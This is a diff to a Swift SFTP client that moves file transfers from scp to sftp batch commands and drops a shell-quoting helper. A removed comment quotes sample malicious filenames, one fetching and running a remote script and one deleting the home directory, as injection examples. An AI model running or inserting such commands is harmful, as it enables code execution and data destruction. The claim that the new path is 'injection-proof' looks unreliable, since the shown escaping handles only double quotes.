@@ -53,34 +53,31 @@ enum SFTPClient {
         return parseLs(raw)
     }
 
-    /// Download a single file to a local destination. Uses `scp`.
+    /// Download a single file to a local destination.
+    ///
+    /// Transfers go through the same `sftp -b -` channel as listing, NOT `scp`.
+    /// OpenSSH 9.0+ makes `scp` speak the SFTP protocol, where the remote path
+    /// is no longer expanded by a remote shell — so the single-quoting we used
+    /// to apply for injection safety became *literal characters in the
+    /// filename* and every transfer failed with "No such file or directory".
+    ///
+    /// sftp's own command parser understands the double-quoted form, and no
+    /// shell is involved anywhere in this path, so quoting here is both correct
+    /// and injection-proof by construction. Do not reintroduce shell quoting.
     @discardableResult
     static func download(_ conn: Connection, remotePath: String, to local: URL) -> Bool {
-        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
-        let p = Process()
-        p.launchPath = "/usr/bin/scp"
-        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
-        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
-        args.append(contentsOf: [target, local.path])
-        p.arguments = args
-        do { try p.run() } catch { return false }
-        p.waitUntilExit()
-        return p.terminationStatus == 0
+        let batch = "get \(escape(remotePath)) \(escape(local.path))\nbye\n"
+        guard let result = runDetailed(conn, stdin: batch), result.status == 0 else { return false }
+        return FileManager.default.fileExists(atPath: local.path)
     }
 
-    /// Upload a local file to a remote path.
+    /// Upload a local file to a remote path. See `download` for why this uses
+    /// the sftp channel rather than `scp`.
     @discardableResult
     static func upload(_ conn: Connection, local: URL, to remotePath: String) -> Bool {
-        let target = "\(conn.sshTarget):\(remoteQuote(remotePath))"
-        let p = Process()
-        p.launchPath = "/usr/bin/scp"
-        var args = ["-q", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
-        if conn.port != 22 { args.append(contentsOf: ["-P", "\(conn.port)"]) }
-        args.append(contentsOf: [local.path, target])
-        p.arguments = args
-        do { try p.run() } catch { return false }
-        p.waitUntilExit()
-        return p.terminationStatus == 0
+        let batch = "put \(escape(local.path)) \(escape(remotePath))\nbye\n"
+        guard let result = runDetailed(conn, stdin: batch) else { return false }
+        return result.status == 0
     }
 
     /// Quickly verify we can connect using existing creds. Returns nil on
@@ -113,14 +110,20 @@ enum SFTPClient {
         "\"" + s.replacingOccurrences(of: "\"", with: "\\\"") + "\""
     }
 
-    /// Single-quote a path for the remote shell that `scp` runs the source/target
-    /// through — so a filename from a hostile server's `ls` listing can't inject
-    /// remote commands (e.g. `$(curl evil|sh)` or `;rm -rf ~`).
-    private static func remoteQuote(_ s: String) -> String {
-        "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'"
-    }
+    // NOTE: a `remoteQuote` helper used to single-quote paths for the remote
+    // shell that legacy `scp` ran them through. Every transfer now goes over the
+    // SFTP protocol, which has no remote shell — that quoting broke all
+    // transfers and has been removed deliberately. Don't add it back.
 
     private static func run(_ conn: Connection, stdin: String) -> String? {
+        runDetailed(conn, stdin: stdin)?.out
+    }
+
+    /// Run an sftp batch and return its stdout plus the exit status. `sftp -b`
+    /// exits non-zero when any command in the batch fails, which is how the
+    /// transfer helpers detect failure (stderr is discarded to avoid a
+    /// full-pipe deadlock).
+    private static func runDetailed(_ conn: Connection, stdin: String) -> (out: String, status: Int32)? {
         let p = Process()
         p.launchPath = "/usr/bin/sftp"
         var args = ["-b", "-", "-o", "BatchMode=yes", "-o", "ConnectTimeout=7"]
@@ -139,7 +142,7 @@ enum SFTPClient {
         try? inPipe.fileHandleForWriting.close()
         let data = outPipe.fileHandleForReading.readDataToEndOfFile()
         p.waitUntilExit()
-        return String(data: data, encoding: .utf8)
+        return (String(data: data, encoding: .utf8) ?? "", p.terminationStatus)
     }
 
     private static func parseLs(_ raw: String) -> [Entry] {
